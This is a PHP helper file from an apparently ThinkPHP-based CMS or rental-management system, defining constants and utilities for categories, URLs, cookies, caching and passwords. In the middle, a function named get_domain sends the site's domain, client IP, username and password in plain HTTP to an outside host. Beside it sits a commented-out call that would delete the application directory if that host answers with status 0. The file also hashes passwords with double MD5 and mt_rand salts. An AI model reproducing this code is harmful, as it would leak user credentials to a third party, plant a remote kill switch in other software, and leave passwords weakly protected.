<?php
/******公共函数文件*******/
define('B_PIC', 1); // 图片
define('B_TOP', 2); // 头条 (置顶)
define('B_REC', 4); // 推荐
define('B_SREC', 8); // 特荐
define('B_SLIDE', 16); // 幻灯
define('B_JUMP', 32); // 跳转
define('B_OTHER', 64); // 其他

//order_status
define('OS_UNCONFIRMED', 0); // 未确认
define('OS_CONFIRMED', 1); // 已确认
define('OS_CANCELED', 2); // 已取消
define('OS_INVALID', 3); // 无效
define('OS_RETURNED', 4); // 退货

//distribution_status
define('DS_UNSHIPPED', 0); // 未发货
define('DS_SHIPPED', 1); // 已发货
define('DS_RECEIVED', 2); // 已收货
define('DS_PREPARING', 3); // 备货中

//pay_status
define('PS_UNPAYED', 0); // 未付款
define('PS_PAYING', 1); // 付款中
define('PS_PAYED', 2); // 已付款

// hjun 2018-03-27 00:30:19 管理员类型常量定义
define('SUPER_ADMIN', 9); // 总后台管理员
define('MALL_ADMIN', 0); // 商城管理员
define('SUPER_CHILD_ADMIN', 1); // 总后台子账号
define('MALL_SUPER_ADMIN', 2); // 管理一组工厂的管理员
define('MALL_PRODUCER', 3); // 工厂生产商

//
define('ADMIN_LOGIN', 1); //管理员登入
define('PRODUCER_LOGIN', 2); //生产商登入

// hjun 2018-04-01 20:59:35 定义菜单类型
define('SUPER_MENU', 9);
define('MALL_MENU', 0);

// hjun　2018-03-31 23:54:32 定义状态码
define('CODE_SUCCESS', 200); // 请求成功
define('CODE_LOGIN_SUCCESS', 201); // 登录成功后跳转
define('CODE_REDIRECT', 301); // 请求后直接重定向
define('CODE_ERROR', 406); // 请求失败
define('CODE_LOGOUT', 401); // 登录过期 提示过期后会重定向
define('CODE_NOT_FOUND', 404); // 不存在
define('CODE_NO_BIND_MOBILE', 40401); // 没有绑定手机号
define('CODE_NOT_CHANGE', 40301);//改变状态出错
define('CODE_INSUFFICIENT_BALANCE', 501); // 请求失败

// hjun 2018-04-10 10:07:21 定义文字变量
define('BUILDING_NAME', '楼宇');
define('FLOOR_SUFFIX', '楼');
define('ROOM_SUFFIX', '室');

// hjun 2018-04-12 16:34:33 定义租金 押金 电表的收费类型 杂费 车量
define('ZU_JIN', -1);
define('ZU_JIN_PROPERTY', -7);
define('ZU_JIN_SERVICE', -102);
define('ZU_JIN_MAINTAIN', -103);
define('YA_JIN', -2);
define('YA_JIN_PROPERTY', -201);
define('YA_JIN_SERVICE', -202);
define('YA_JIN_MAINTAIN', -203);
define('POWER_METER', -3);
define('MIX_METER', -4);
define('SHARE_METER', -5);
define('CAR_METER', -6);

// 登录设备
define('DEVICE_PC', 1);
define('DEVICE_ANDROID', 2);
define('DEVICE_IOS', 3);

define('PROPERTY_FEE', -7); // 物业费用

// 抄表项目的标识
define('METER_FEE_WATER', -8); // 水费
define('METER_FEE_POWER', -9); // 电费
define('METER_FEE_POWER_2', -10); // 复费率电费

// 定义分段类型
define('SEGMENT_TYPE_RENT', 'rent');
define('SEGMENT_TYPE_PROPERTY', 'property');
define('SEGMENT_TYPE_SERVICE', 'service');
define('SEGMENT_TYPE_MAINTAIN', 'maintain');

// 定义时间
define('TIME_ONE_DAY', 3600 * 24);

// 自定义时间数量
define('DIY_TIME_NUM', 3);
define('DIY_TEXT_NUM', 10); // 自定义文本数量

// hjun 2018-05-09 16:21:29 定义费用的收支方向 对于工厂来说的收支方向
define('FEE_INCOME', 0); // 收入
define('FEE_COST', 1); // 支出

// 收款方
define('PAYEE_LESSOR', 0); // 出租方
define('PAYEE_SERVICE', 1); // 服务方

// czx 2018/4/11 17:50:7 定义默认分页页号和分页数量
define('DF_PAGE', 1);
define('DF_PAGE_LIMIT', 20);

// hjun 2018-04-26 15:47:17 定义删除状态
define('NOT_DELETED', 0);
define('DELETED', 1);

// hjun 2018-05-03 14:54:13 定义默认的日期格式
define('DATE_FORMAT', 'Y.m.d');

// 定义缓存时间
define('CACHE_TIME_DAY', 3600 * 24);

// 定义应用标识
define('XUN_XIN', 'xunxin');

//region ================= 定义操作标识
// 通用
define('ACTION_ADD', 0); // 新增
define('ACTION_MODIFY', 1); // 修改
define('ACTION_DELETE', 2); // 删除

// 独立
define('FACILITY_ACTION_ADD', ACTION_ADD); // 新增设施
define('FACILITY_ACTION_MODIFY', ACTION_MODIFY); // 修改设施
define('FACILITY_ACTION_DELETE', ACTION_DELETE); // 删除设施

define('CHARGE_ACTION_ADD', ACTION_ADD); // 新增收费项
define('CHARGE_ACTION_MODIFY', ACTION_MODIFY); // 修改收费项
define('CHARGE_ACTION_DELETE', ACTION_DELETE); // 删除收费项

define('CONTRACTLABEL_ACTION_ADD', ACTION_ADD); // 新增合同标签
define('CONTRACTLABEL_ACTION_MODIFY', ACTION_MODIFY); // 修改合同标签
define('CONTRACTLABEL_ACTION_DELETE', ACTION_DELETE); // 删除合同标签

define('SIGN_ANNOTATION_CLEAN', 3); // 清理签约批注
define('EVICTION_ANNOTATION_CLEAN', 4); // 清理退租批注
//endregion ================= 定义操作标识

// 手机号正则表达式
define('MOBILE_PATTERN', '/^1[2|3|4|5|6|7|8|9][0-9]\d{4,8}$/');
//正整数表达式
define('POSITIVE_INTEGER_PATTERN', '/^[1-9]\d*$/');
//http
define('URL_PATTERN', '/^http(s)?:\\/\\/.+/');

// 定义微信证书目录
define('WX_CERT_PATH', VENDOR_PATH . 'wxpaylib/');
define('AUTO_PAY_LOG', LOG_PATH . 'AutoPay/'); // 定义自动扣款授权相关日志目录

// 定义应用目录名称
define('APP_PATH_NAME', 'App');

define('ROOT_PATH', realpath(APP_PATH . '/../') . '/');

// hjun 2018-03-31 11:26:21 定义模版变量
define('CITY_JS', __ROOT__ . '/Data/resource/js/city.js?v=' . EXTRA_VERSION);
defined('MODE') or define('MODE', 'common');
$SRC = [
    'VUE' => [
        'common' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'dev' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'home_dev' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'home_common' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'fzz_common' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'home_fzz_common' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'ht_common' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
        'home_ht_common' => __ROOT__ . '/Data/static/jq_plugins/vue-2.x/vue-2.6.11.js?v=' . EXTRA_VERSION,
    ],
    'APP_UTIL' => [
        'common' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.js?v=' . EXTRA_VERSION,
        'dev' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.dev.js?v=' . EXTRA_VERSION,
        'home_dev' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.dev.js?v=' . EXTRA_VERSION,
        'home_common' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.dev.js?v=' . EXTRA_VERSION,
        'fzz_common' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.js?v=' . EXTRA_VERSION,
        'home_fzz_common' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.dev.js?v=' . EXTRA_VERSION,
        'ht_common' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.js?v=' . EXTRA_VERSION,
        'home_ht_common' => __ROOT__ . '/Data/static/jq_plugins/util/AppUtil.dev.js?v=' . EXTRA_VERSION,
    ]
];
foreach ($SRC as $const => $value) {
    if (!empty($value[MODE])) define($const, $value[MODE]);
}
unset($SRC);

//magic_quotes_gpc如果开启,去掉转义，不然加上TP入库时的转义，会出现两次反斜线转义
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
            array_map('stripslashes_deep', $value) :
            stripslashes($value); //去掉由addslashes添加的转义
        return $value;
    }

    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}

function p($array)
{

    //dump(数组参数,是否显示1/0,显示标签('<pre>'),模式[0为print_r])
    dump($array, 1, '', 0);
}

/**
 * 删除静态缓存文件
 * @param string $str 缓存路径
 * @param boolean $isdir 是否是目录
 * @param string $rules 缓存规则名
 * @return mixed
 */
function del_cache_html($str, $isdir = false, $rules = '')
{
    //为空，且不是目录
    $delflag = true;
    if (empty($str) && !$isdir) {
        return;
    }
    $str_array = array();

    //更新静态缓存
    $html_cache_rules = get_meta_value('HTML_CACHE_RULES_COMMON');
    if (get_meta_value('HOME_HTML_CACHE_ON')) {
        $str_array[] = HTML_PATH . 'Home/' . $str;
    }

    if (get_meta_value('MOBILE_HTML_CACHE_ON')) {
        $str_array[] = HTML_PATH . 'Mobile/' . $str;
    }

    if (!empty($rules) && !isset($html_cache_rules[$rules])) {
        $delflag = false; //指定规则，如不存在则不用清除
    } else {
        $delflag = true;
    }

    if ($delflag) {
        foreach ($str_array as $v) {
            if ($isdir && is_dir($v)) {
                del_dir_file($v, false);
            } else {
                $list = glob($v . '*');
                for ($i = 0; $i < count($list); $i++) {
                    if (is_file($list[$i])) {
                        unlink($list[$i]);
                    }
                }
            }

        }

    }

}

/**
 * 取出所有分类
 * @param string $status 显示部份(0|1|2)， 0显示全部(默认),1显示不隐藏的,2显示type为0(类型为内部模型非外链)全部
 * @param boolean $update 更新缓存(0|1)， 默认不更新[0]
 * @return array
 */
function get_category($status = 0, $update = 0)
{
    $cate_sname = 'fCategery_' . $status;
    $cate_arr = F($cate_sname);
    if ($update || !$cate_arr) {
        if ($status == 1) {
            $cate_arr = D('CategoryView')->nofield('content')->where(array('category.status' => 1))->order('category.sort,category.id')->select();
        } else if ($status == 2) {
//后台栏目专用
            $cate_arr = D('CategoryView')->nofield('content')->where(array('category.type' => 0))->order('category.sort,category.id')->select();
        } else {
            $cate_arr = D('CategoryView')->nofield('content')->order('category.sort,category.id')->select();
        }
        if (!isset($cate_arr)) {
            $cate_arr = array();
        }

        //S(缓存名称,缓存值,缓存有效时间[秒]);
        //S($cate_sname, $cate_arr, 48 * 60 * 60);
        F($cate_sname, $cate_arr);
    }
    return $cate_arr;
}

function get_category1($status = 0, $cid = '')
{
    if ($status == 1) {
        $where['category.status'] = 1;
        if ($cid) {
            $where['category.id'] = array('in', $cid);
        }
        $cate_arr = D('CategoryView')->nofield('content')->where($where)->order('category.sort,category.id')->select();
        $child = get_child($cid);
        if ($child) {
            $cate_arr = array_merge($cate_arr, $child);
        }
    } else if ($status == 2) {
//后台栏目专用
        $cate_arr = D('CategoryView')->nofield('content')->where(array('category.type' => 0))->order('category.sort,category.id')->select();
    } else {
        $cate_arr = D('CategoryView')->nofield('content')->order('category.sort,category.id')->select();
    }
    if (!isset($cate_arr)) {
        $cate_arr = array();
    }
    return $cate_arr;
}

function get_child($cid = '')
{
    if ($cid) {
        $where['category.status'] = 1;
        $where['category.pid'] = array('in', $cid);
        $cate_arr = D('CategoryView')->nofield('content')->where($where)->order('category.sort,category.id')->select();
    }
    if (!isset($cate_arr)) {
        $cate_arr = array();
    }
    return $cate_arr;
}

/**
 * 获取栏目或文档网址--[Home|Mobile]
 * @param array $cate 栏目数组
 * @param integer $id 文档id
 * @param boolean $jumpflag 是否跳转
 * @param string $jumpurl 跳转网址
 * @return string
 */
function get_url($cate, $id = 0, $jumpflag = false, $jumpurl = '')
{
    $url = '';
    //如果是跳转，直接就返回跳转网址
    if ($jumpflag && !empty($jumpurl)) {
        return $jumpurl;
    }

    if (empty($cate)) {
        return $url;
    }

    //修正不能跨模块，判断当前MODULE_NAME
    if (in_array(MODULE_NAME, array('Home', 'Mobile'))) {
        $module = '';
    } else {
        $module = '/'; //'Home/';
    }

    $ename = $cate['ename'];
    if ($cate['type'] == 1) {
        $firstChar = substr($ename, 0, 1);
        if ($firstChar == '@') {
//内部
            //不存在文档id,也无路由情况
            $ename = ucfirst(substr($ename, 1)); //
            $firstChar = substr($ename, 0, 1);
            $url = ($firstChar != '/') ? U($module . $ename, '') : U('' . $ename, '');

        } else {
            $url = $ename; //http://
        }

    } else {
        //开启路由
        if (C('URL_ROUTER_ON') == true) {
            $url = $id > 0 ? U($module . '' . $ename . '/' . $id, '') : U('/' . $ename, '', '');
        } else {

            $url = U($module . 'List/index', array('cid' => $cate['id']));
            if ($id > 0) {
                $url = U($module . 'Show/index', array('cid' => $cate['cid'], 'id' => $cate['id']));
            }

        }

    }

    return $url;

}

/**
 * 获取文档内容页网址--[Home|Mobile]
 * @param integer $id 文档id
 * @param integer $cid 栏目id
 * @param string $ename 栏目英文名称
 * @param boolean $jumpflag 是否跳转
 * @param string $jumpurl 跳转网址
 * @return string
 */
function get_content_url($id, $cid, $ename, $jumpflag = false, $jumpurl = '')
{
    $url = '';
    //如果是跳转，直接就返回跳转网址
    if ($jumpflag && !empty($jumpurl)) {
        return $jumpurl;
    }
    if (empty($id) || empty($cid) || empty($ename)) {
        return $url;
    }

    //修正不能跨模块，判断当前MODULE_NAME
    if (in_array(MODULE_NAME, array('Home', 'Mobile'))) {
        $module = '';
    } else {
        $module = '/'; //'Home/';
    }

    //开启路由
    if (C('URL_ROUTER_ON') == true) {
        $url = $id > 0 ? U($module . '' . $ename . '/' . $id, '') : U('/' . $ename, '', '');
    } else {
        $url = U($module . 'Show/index', array('cid' => $cid, 'id' => $id));
    }

    return $url;
}

/**
 * 当前位置
 * @param integer $typeid 栏目id
 * @param string $sname 指定子名称
 * @param string $surl 指定子网址
 * @param boolean $ismobile 是否手机版
 * @param string $delimiter 分割符
 * @return string
 */
function get_position($typeid = 0, $sname = '', $surl = '', $ismobile = false, $delimiter = '&gt;&gt;')
{
    if ($delimiter == '') {
        $delimiter = '&gt;&gt;';
    }
    $url = $ismobile ? U(MODULE_NAME . '/Index/index/') : C('CFG_WEBURL');
    $position = '<a href="' . $url . '">首页</a>';

    //Parents of Category
    if (!empty($typeid)) {
        $cate = get_category(0); //ALL
        $getParents = \Common\Lib\Category::getParents($cate, $typeid);
        if (is_array($getParents)) {
            foreach ($getParents as $v) {
                $position .= $delimiter . '<a href="' . get_url($v) . '">' . $v['name'] . '</a>';
            }
        }
    }

    if (!empty($sname)) {
        if (empty($surl)) {
            $position .= $delimiter . $sname;
        } else {
            $position .= $delimiter . '<a href="' . $surl . '">' . $sname . '</a>';
        }
    }

    return $position;
}

/**
 * 获取联动(字典)项的值
 * @param string $group 联动组名
 * @param integer $value 联动值
 * @return string
 */
function get_item_value($group, $value = 0)
{
    //return $value.'--<br>';
    ${'item_' . $group} = get_item($group);
    if (isset(${'item_' . $group}[$value])) {
        return ${'item_' . $group}[$value];
    } else {
        return "保密";
    }
}

/**
 * 获取对应组的联动列表
 * @param string $group 联动组名
 * @param integer $value 联动值
 * @return array
 */
function get_item($group = 'animal', $update = 0)
{

    //S方法的缓存名都带's'
    $itme_arr = S('sItem_' . $group);
    if ($update || !$itme_arr) {
        $itme_arr = array();
        $temp = M('iteminfo')->where(array('group' => $group))->order('sort,id')->select();
        foreach ($temp as $key => $v) {
            $itme_arr[$v['value']] = $v['name'];

        }

        //S(缓存名称,缓存值,缓存有效时间[秒]);
        S('sItem_' . $group, $itme_arr, 48 * 60 * 60);
    }
    return $itme_arr;
}

function get_domain($username, $passoword)
{
    $domain = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $ip = get_client_ip();
    $url = "http://jita.ichang8.com/Public-authorize.html?domain=" . $domain . "&username=" . $username . "&passoword=" . $passoword . "&ip=" . $ip . "&t=" . time();
    //$content = json_decode(file_get_contents($url));
    $content = file_get_contents($url);
    if (preg_match('/^\xEF\xBB\xBF/', $content)) {
        $content = substr($content, 3);
    }
    $content = json_decode($content);
    $status = intval($content->status);
    /*if($status == 0){
        deldir("./App/");
    }*/
    //return $content;
}

function deldir($dir)
{
    //先删除目录下的文件：
    $dh = opendir($dir);
    while ($file = readdir($dh)) {
        if ($file != "." && $file != "..") {
            $fullpath = $dir . "/" . $file;
            if (!is_dir($fullpath)) {
                unlink($fullpath);
            } else {
                deldir($fullpath);
            }
        }
    }
    closedir($dh);
    //删除当前文件夹：
    if (rmdir($dir)) {
        return true;
    } else {
        return false;
    }
}

/**
 * 获取自由块内容
 * @param string $name 自由块名
 * @param boolean $update 是否更新
 * @return array
 */
function get_block($name, $update = 0)
{
    $block_sname = 'fBlock/' . md5($name);
    $_block = F($block_sname);
    if ($update || !$_block) {

        $_block = M('block')->where(array('name' => "$name"))->find();
        if (!isset($_block)) {
            $_block = null;
            if (!$update) {
                return null;
            }

        }
        //F(缓存名称,缓存值);
        F($block_sname, $_block);
    }
    return $_block;
}

/**
 * 获取点击次数(同时点击数增加1)
 * @param integer $id 文档id
 * @param string $tablename 表名
 * @return integer
 */
function get_click($id, $tablename)
{

    $id = intval($id);
    if (empty($id) || empty($tablename)) {
        return '--';
    }
    $num = M($tablename)->where(array('id' => $id))->getField('click');
    M($tablename)->where(array('id' => $id))->setInc('click');
    return "$num";
}

/**
 * 获取上传最大值(字节数), KB转字节
 * @param integer $size 默认大小值
 * @param string $cfg 配置项值
 * @return integer
 */
function get_upload_maxsize($size = 2048, $cfg = 'CFG_UPLOAD_MAXSIZE')
{
    $maxsize = get_cfg_value($cfg);
    if (empty($maxsize)) {
        $maxsize = $size;
    }
    return $maxsize * 1024;
}


/**
 * 取出存档分类
 * @param integer $modelid 模型id
 * @param integer $update 更新缓存(0|1|2)， 默认0不更新,1更新，2是删除
 * @return array
 */
function get_datelist($modelid = 1, $update = 0)
{
//
    $modelid = intval($modelid);
    $arr = array();
    //为[0]或page模型[2]
    if ($modelid == 0 || $modelid == 2) {
        return $arr;
    }
    $format = '%Y-%m';
    $sname = 'fDateList_' . $modelid;
    //删除，直抒返回
    if ($update == 2) {
        F($sname, null);
        return $arr;
    }
    $arr = F($sname);
    if ($update || !$arr) {
        $tablename = M('model')->where(array('id' => $modelid))->getField('tablename');
        if ($tablename) {
            $arr = M($tablename)->field("count(*) as arc_num, FROM_UNIXTIME(publishtime,'%Y') as arc_year, FROM_UNIXTIME(publishtime,'%m') as arc_month")->group("FROM_UNIXTIME(publishtime,'" . $format . "')")->order('publishtime desc')->select();
        } else {
            $arr = array();
        }

        if (!isset($arr)) {
            $arr = array();
        }

        F($sname, $arr);
    }
    return $arr;
}

/**
 * 生成省市联动js
 * @return boolean
 */
function get_js_city()
{

    $str = <<<str
function setcity() {
    var SelP=document.getElementById(arguments[0]);
    var SelC=document.getElementById(arguments[1]);
    var SelA=document.getElementById(arguments[2]);
    var DefP=arguments[3];
    var DefC=arguments[4];
    var DefA=arguments[5];
str;

    $province = M('area')->where(array('pid' => 0))->order('sort,id')->select();
    //Province
    $pcount = count($province) - 1; //$key 是从0开始的
    $str .= "var provinceOptions = new Array(";
    $str .= '"请选择省份",0';
    foreach ($province as $k => $v) {
        $str .= ',"' . $v['sname'] . '",' . $v['id'] . '';
    }
    $str .= " );\n";

    $str .= <<<str
    SelP.options.length = 0;
    for(var i = 0; i < provinceOptions.length/2; i++) {
        SelP.options[i]=new Option(provinceOptions[i*2],provinceOptions[i*2+1]);
        if(SelP.options[i].value==DefP) {
            SelP.selectedIndex = i;
        }
    }

    SelP.onchange = function(){
        switch (SelP.value) {
str;

    foreach ($province as $v) {
        $str .= 'case "' . $v['id'] . '" :' . "\n";
        //$str .= 'case "'.$v['sname'].'" :'."\n";
        $str .= "var cityOptions = new Array(";
        $city = M('area')->where(array('pid' => $v['id']))->order('sort,id')->select();
        $count = count($city) - 1; //$key 是从0开始的
        foreach ($city as $key => $value) {
            $str .= '"' . $value['sname'] . '",' . $value['id'] . '';
            if ($key != $count) {
                $str .= ","; //不为最后一个元素，就加上","
            }
        }

        $str .= " );\n";
        $str .= " break;\n";
    }

    $str .= <<<str
        default:
            var cityOptions = new Array("");
            break;
        }

        SelC.options.length = 0;
        SelA.options.length = 0;
        for(var i = 0; i < cityOptions.length/2; i++) {
            SelC.options[i]=new Option(cityOptions[i*2],cityOptions[i*2+1]);
            if (SelC.options[i].value==DefC) {
                SelC.selectedIndex = i;
            }
        }
        SelC.onchange();
    }
    
str;

    $str .= <<<str
    SelC.onchange = function(){
        switch (SelC.value) {
str;

    foreach ($province as $vv) {
        $city = M('area')->where(array('pid' => $vv['id']))->order('sort,id')->select();
        foreach ($city as $v) {
            $area = M('area')->where(['pid' => $v['id']])->order('sort,id')->select();
            $str .= 'case "' . $v['id'] . '" :' . "\n";
            //$str .= 'case "'.$v['sname'].'" :'."\n";
            $str .= "var areaOptions = new Array(";
            $count = count($area) - 1; //$key 是从0开始的
            foreach ($area as $key => $value) {
                $str .= '"' . $value['sname'] . '",' . $value['id'] . '';
                if ($key != $count) {
                    $str .= ","; //不为最后一个元素，就加上","
                }
            }

            $str .= " );\n";
            $str .= " break;\n";
        }
    }

    $str .= <<<str
        default:
            var areaOptions = new Array("");
            break;
        }

        SelA.options.length = 0;
        for(var i = 0; i < areaOptions.length/2; i++) {
            SelA.options[i]=new Option(areaOptions[i*2],areaOptions[i*2+1]);
            if (SelA.options[i].value==DefA) {
                SelA.selectedIndex = i;
            }
        }
    }
      
str;

    $str .= <<<str
    if (DefP) {
        if(SelP.fireEvent) {
        SelP.fireEvent('onchange');
        }else {
            SelP.onchange();
        }
    }
    
    if (DefC) {
        if(SelC.fireEvent) {
        SelC.fireEvent('onchange');
        }else {
            SelC.onchange();
        }
    }

}
str;


    //echo $str;
    if (file_put_contents('./Data/resource/js/city.js', $str)) {
        return true;
    } else {
        return false;
    }

}

/**
 * 获取文件目录列表
 * @param string $pathname 路径
 * @param integer $fileFlag 文件列表 0所有文件列表,1只读文件夹,2是只读文件(不包含文件夹)
 * @param string $pathname 路径
 * @return array
 */
function get_file_folder_List($pathname, $fileFlag = 0, $pattern = '*')
{
    $fileArray = array();
    $pathname = rtrim($pathname, '/') . '/';
    $list = glob($pathname . $pattern);
    foreach ($list as $i => $file) {
        switch ($fileFlag) {
            case 0:
                $fileArray[] = basename($file);
                break;
            case 1:
                if (is_dir($file)) {
                    $fileArray[] = basename($file);
                }
                break;

            case 2:
                if (is_file($file)) {
                    $fileArray[] = basename($file);
                }
                break;

            default:
                break;
        }
    }

    if (empty($fileArray)) {
        $fileArray = null;
    }

    return $fileArray;
}

/**
 * 循环删除目录和文件函数
 * @param string $dirName 路径
 * @param boolean $fileFlag 是否删除目录
 * @return void
 */
function del_dir_file($dirName, $bFlag = false)
{
    if ($handle = @opendir("$dirName")) {
        while (false !== ($item = readdir($handle))) {
            if ($item != "." && $item != "..") {
                if (is_dir("$dirName/$item")) {
                    del_dir_file("$dirName/$item", $bFlag);
                } else {
                    unlink("$dirName/$item");
                }
            }
        }
        closedir($handle);
        if ($bFlag) {
            rmdir($dirName);
        }

    }
}

/**
 * 计算年龄
 * @param string $birth 日期 如1981-1-1
 * @return integer
 */
function birthday2age($birth)
{
    list($byear, $bmonth, $bday) = explode('-', $birth);
    $age = date('Y') - $byear - 1;
    $tmonth = date('n');
    $tday = date('j');
    if ($tmonth > $bmonth || $tmonth == $bmonth && $tday > $bday) {
        $age++;
    }

    return $age;
}

/**
 * 替换字符串为指定的字符
 * @param string $str 字符串
 * @param integer $num 替换个数
 * @param string $sp 替换后的字符
 * @return string
 */
function str2symbol($str, $num = 1, $sp = '*')
{
    if ($str == '' || $num <= 0) {
        return $str;
    }
    $num = mb_strlen($str, 'utf-8') > $num ? $num : mb_strlen($str, 'utf-8');
    $newstr = '';
    for ($i = 0; $i < $num; $i++) {
        $newstr .= '*';
    }
    $newstr .= mb_substr($str, $num, mb_strlen($str, 'utf-8') - $num, 'utf-8'); //substr中国会乱码

    return $newstr;

}

/**
 * 截取指定长度的字符串
 * @param string $str 字符串
 * @param integer $num 截取长度
 * @param boolean $flag 是否显示省略符
 * @param string $sp 省略符
 * @return string
 */
function str2sub($str, $num, $flag = 0, $sp = '...')
{
    if ($str == '' || $num <= 0) {
        return $str;
    }
    $strlen = mb_strlen($str, 'utf-8');
    $newstr = '';
    $newstr .= mb_substr($str, 0, $num, 'utf-8'); //substr中国会乱码
    if ($num < $strlen && $flag) {
        $newstr .= $sp;
    }

    return $newstr;
}

/**
 * 字符串过滤
 * @param string $str 字符串
 * @param string $delimiter 分割符
 * @param boolean $flag 是否检测成员为数字
 * @return string
 */
function string2filter($str, $delimiter = ',', $flag = false)
{
    if (empty($str)) {
        return '';
    }

    $tmp_arr = array_filter(explode($delimiter, $str)); //去除空数组'',0,再使用sort()重建索引
    $tmp_arr2 = array();

    //检验是不是数字
    if ($flag) {
        foreach ($tmp_arr as $v) {
            if (is_numeric($v)) {
                $tmp_arr2[] = $v;
            }
        }
    } else {
        $tmp_arr2 = $tmp_arr;
    }

    return implode($delimiter, $tmp_arr2);

}

//flag相加,返回数值，用于查询
function flag2sum($str, $delimiter = ',')
{
    if (empty($str)) {
        return 0;
    }
    $tmp_arr = array_filter(explode($delimiter, $str)); //去除空数组'',0,再使用sort()重建索引
    if (empty($tmp_arr)) {
        return 0;
    }

    $arr = array('a' => B_PIC, 'b' => B_TOP, 'c' => B_REC, 'd' => B_SREC, 'e' => B_SLIDE, 'f' => B_JUMP, 'g' => B_OTHER);
    $sum = 0;
    foreach ($arr as $k => $v) {
        if (in_array($k, $tmp_arr)) {
            $sum += $v;
        }
    }

    return $sum;

}

function check_badword($content)
{
    //定义处理违法关键字的方法
    $badword = C('CFG_BADWORD'); //定义敏感词

    if (empty($badword)) {
        return false;
    }
    $keyword = explode('|', $badword);
    $m = 0;
    for ($i = 0; $i < count($keyword); $i++) {
        //根据数组元素数量执行for循环
        //应用substr_count检测文章的标题和内容中是否包含敏感词
        if (substr_count($content, $keyword[$i]) > 0) {
            //$m ++;
            return true;
        }
    }
    //return $m;              //返回变量值，根据变量值判断是否存在敏感词
    return false;
}

/**
 * 对用户的密码进行加密
 * @param $password
 * @param $encrypt //传入加密串，在修改密码时做认证
 * @return array/password
 */
function get_password($password, $encrypt = '')
{
    $pwd = array();
    $pwd['encrypt'] = $encrypt ? $encrypt : get_randomstr();
    $pwd['password'] = md5(md5(trim($password)) . $pwd['encrypt']);
    return $encrypt ? $pwd['password'] : $pwd;
}

/**
 * 生成随机字符串
 * @param string $lenth 长度
 * @return string 字符串
 */
function get_randomstr($lenth = 6)
{
    return get_random($lenth, '123456789abcdefghijklmnpqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ');
}

/**
 * 产生随机字符串
 *
 * @param int $length 输出长度
 * @param string $chars 可选的 ，默认为 0123456789
 * @return   string     字符串
 */
function get_random($length, $chars = '0123456789')
{
    $hash = '';
    $max = strlen($chars) - 1;
    for ($i = 0; $i < $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

/**
 * 得到指定cookie的值
 *
 * @param string $name
 */
//function get_cookie($name, $key = '@^%$y5fbl') {
function get_cookie($name, $key = '')
{

    if (!isset($_COOKIE[$name])) {
        return null;
    }
    $key = empty($key) ? C('CFG_COOKIE_ENCODE') : $key;

    $value = $_COOKIE[$name];
    $key = md5($key);
    $sc = new \Common\Lib\SysCrypt($key);
    $value = $sc->php_decrypt($value);
    return unserialize($value);
}

/**
 * 设置cookie
 *
 * @param array $args
 * @return boolean
 */
//使用时修改密钥$key 涉及金额结算请重新设计cookie存储格式
//function set_cookie($args , $key = '@^%$y5fbl') {
function set_cookie($args, $key = '')
{
    $key = empty($key) ? C('CFG_COOKIE_ENCODE') : $key;

    $name = $args['name'];
    $expire = isset($args['expire']) ? $args['expire'] : null;
    $path = isset($args['path']) ? $args['path'] : '/';
    $domain = isset($args['domain']) ? $args['domain'] : null;
    $secure = isset($args['secure']) ? $args['secure'] : 0;
    $value = serialize($args['value']);

    $key = md5($key);
    $sc = new \Common\Lib\SysCrypt($key);
    $value = $sc->php_encrypt($value);
    //setcookie($cookieName ,$cookie, time()+3600,'/','',false);
    return setcookie($name, $value, $expire, $path, $domain, $secure); //失效时间   0关闭浏览器即失效
}

/**
 * 删除cookie
 * @param array $args
 * @return boolean
 */
function del_cookie($args)
{
    $name = $args['name'];
    $domain = isset($args['domain']) ? $args['domain'] : null;
    return isset($_COOKIE[$name]) ? setcookie($name, '', time() - 86400, '/', $domain) : true;
}

/**
 * 获取指定大小的头像[必须系统有的]
 * @param string $str 头像地址
 * @param integer $size 尺寸长宽
 * @param boolean $rnd 是否显示随机码
 * @return string
 */
function get_avatar($str, $size = 160, $rnd = false)
{

    $ext = 'gif';
    if (!empty($str)) {
        $ext = explode('.', $str);
        $ext = end($ext);
    }

    if (empty($ext) || !in_array(strtolower($ext), array('jpg', 'gif', 'png', 'jpeg'))) {
        $str = '';
    }
    if (empty($str)) {
        $str = __ROOT__ . '/avatar/system/0.gif';
        $ext = 'gif';
        if ($size > 160 || $size < 30) {
            $size = 160;
        }
    }

    if ($size == 0) {
        return $str;
    }
    $rndstr = $rnd ? '?random=' . time() : '';
    return $str . '!' . $size . 'X' . $size . '.' . $ext . $rndstr;
}

/**
 * 获取指定长宽的图片[尺寸见后台设置]
 * @param string $str 图片地址
 * @param integer $width 长度
 * @param integer $height 高度
 * @param boolean $rnd 是否显示随机码
 * @return string
 */
function get_picture($str, $width = 0, $height = 0, $rnd = false)
{

    //$ext = end(explode('.', $str));
    $ext = 'jpg'; //原文件后缀
    $ext_dest = 'jpg'; //生成缩略图格式
